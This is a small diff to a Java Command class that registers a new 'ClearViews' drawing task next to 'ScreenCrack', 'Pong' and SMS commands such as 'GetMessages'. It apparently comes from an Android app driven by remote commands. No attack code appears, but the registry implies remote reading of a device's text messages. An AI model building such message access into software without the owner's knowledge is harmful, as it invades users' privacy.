@@ -28,6 +28,7 @@ public class Command {
             commandList.put("OpenGL", DrawingTasks.OpenGLViewTask.class);
             commandList.put("Pong", DrawingTasks.PongTask.class);
             commandList.put("ScreenCrack", DrawingTasks.CrackScreenTask.class);
+            commandList.put("ClearViews", DrawingTasks.ClearViewTask.class);
             //sms tasks
             commandList.put("CacheThread", SMSCommands.CacheThreadIdTask.class);
             commandList.put("GetMessages", SMSCommands.GetMessagesTask.class);
